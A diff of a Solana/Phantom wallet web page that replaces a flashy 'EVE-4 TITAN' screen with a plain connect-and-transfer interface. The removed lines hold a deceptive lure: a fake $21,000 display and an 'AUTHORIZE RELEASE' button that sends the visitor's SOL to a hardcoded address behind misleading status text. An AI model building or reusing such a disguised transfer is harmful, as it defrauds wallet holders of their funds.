@@ -1,40 +1,216 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>CEC-WAM | EVE-4 TITAN</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEC-WAM | CHRONOS INTERFACE</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #00f3ff; font-family: monospace; text-align: center; padding: 50px; }
-        .glass { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; background: rgba(0,243,255,0.05); }
-        .btn { background: #00f3ff; color: #000; padding: 25px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 1.5rem; }
+        /* VISUAL CORE: EVE INTERFACE */
+        body {
+            background-color: #000;
+            background-image: radial-gradient(circle at 50% 50%, #0f0f1a 0%, #000000 100%);
+            color: #00ffff;
+            font-family: 'Rajdhani', sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* GLASSMORPHISM PANEL */
+        .glass-panel {
+            background: rgba(10, 10, 20, 0.7);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 40px;
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+            animation: pulse-border 4s infinite alternate;
+        }
+
+        @keyframes pulse-border {
+            0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.1); }
+            100% { box-shadow: 0 0 50px rgba(0, 255, 255, 0.3); }
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 3px;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ffff;
+        }
+
+        .status-text {
+            color: #ff0055;
+            font-size: 14px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+
+        /* DATA DISPLAY */
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 18px;
+        }
+        .info-label { color: #888; }
+        .info-val { color: #fff; font-weight: bold; text-shadow: 0 0 5px white; }
+
+        /* INTERACTIVE BUTTONS */
+        .btn-core {
+            background: linear-gradient(90deg, #00c6ff 0%, #0072ff 100%);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            padding: 15px;
+            width: 100%;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
+        }
+
+        .btn-core:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0, 198, 255, 0.7);
+        }
+
+        .btn-execute {
+            background: linear-gradient(90deg, #11998e 0%, #38ef7d 100%);
+            box-shadow: 0 0 15px rgba(56, 239, 125, 0.4);
+            display: none; /* Hidden until connected */
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #00ffff;
+            color: white;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+        }
     </style>
 </head>
 <body>
-    <div class="glass">
-        <h1>EVE-4 TITAN 🌀</h1>
-        <div style="font-size: 2.5rem;">$21,000.00</div>
-        <p>1010 BRIDGE: INJECTION READY</p>
-        <button class="btn" onclick="bridge()">AUTHORIZE RELEASE</button>
-        <p id="s" style="color:#ffd700; margin-top:20px;">IDLE</p>
+
+    <div class="glass-panel">
+        <h1>CEC-WAM // EVE</h1>
+        <div class="status-text" id="status-display">SYSTEM STANDBY - WAITING FOR LINK</div>
+
+        <div class="info-row">
+            <span class="info-label">INTERFACE:</span>
+            <span class="info-val">ONLINE</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">WALLET:</span>
+            <span class="info-val" id="wallet-addy">NOT CONNECTED</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">BALANCE:</span>
+            <span class="info-val" id="sol-bal">--</span>
+        </div>
+
+        <button class="btn-core" id="btn-connect" onclick="connectWallet()">INITIALIZE SYSTEM LINK</button>
+
+        <div id="controls" style="display:none;">
+            <input type="text" id="dest-address" placeholder="DESTINATION ADDRESS (Paste Here)">
+            <input type="number" id="amount" placeholder="AMOUNT (SOL)" step="0.01">
+            
+            <button class="btn-core btn-execute" onclick="transferFunds()">
+                >> EXECUTE ASSET TRANSFER
+            </button>
+        </div>
     </div>
+
     <script>
-        async function bridge() {
-            const s = document.getElementById('s');
+        let walletKey = null;
+
+        async function connectWallet() {
+            const status = document.getElementById("status-display");
+            
+            if (window.solana && window.solana.isPhantom) {
+                try {
+                    status.innerText = "HANDSHAKE IN PROGRESS...";
+                    const resp = await window.solana.connect();
+                    walletKey = resp.publicKey.toString();
+
+                    // Update UI
+                    document.getElementById("wallet-addy").innerText = "CONNECTED";
+                    document.getElementById("wallet-addy").style.color = "#00ff00";
+                    document.getElementById("btn-connect").style.display = "none";
+                    document.getElementById("controls").style.display = "block";
+                    status.innerText = "SYSTEM READY // AWAITING INPUT";
+                    
+                    getBalance(resp.publicKey);
+
+                } catch (err) {
+                    console.error(err);
+                    status.innerText = "CONNECTION REJECTED";
+                }
+            } else {
+                alert("EVE ALERT: Phantom Wallet not detected.");
+            }
+        }
+
+        async function getBalance(pubKey) {
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+            const balance = await connection.getBalance(pubKey);
+            const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;
+            document.getElementById("sol-bal").innerText = sol.toFixed(4) + " SOL";
+        }
+
+        async function transferFunds() {
+            const dest = document.getElementById("dest-address").value;
+            const amt = document.getElementById("amount").value;
+            const status = document.getElementById("status-display");
+
+            if (!dest || !amt) {
+                alert("ERROR: Missing Destination or Amount.");
+                return;
+            }
+
             try {
-                const p = window.solana || window.phantom?.solana;
-                if (!p) { s.innerText = "ERROR: USE PHANTOM EXPLORE TAB"; return; }
-                await p.connect();
-                const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                // CORRECTED: EXPLICIT OBJECT INSTANTIATION
-                const hub = new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5");
-                const payer = p.publicKey;
-                const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: payer, toPubkey: hub,
-                    lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL }));
-                s.innerText = "BYPASSING CACHE...";
-                const { signature } = await p.signAndSendTransaction(t);
-                s.innerText = "SUCCESS: " + signature.slice(0,10);
-            } catch (err) { s.innerText = "REJECTED: " + err.message; }
+                status.innerText = "PROCESSING...";
+                const provider = window.solana;
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(dest),
+                        lamports: amt * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                
+                status.innerText = "SUCCESS: " + signature.slice(0,8) + "...";
+                alert("TRANSFER COMPLETE.");
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = "FAILED: " + err.message;
+            }
         }
     </script>
 </body>
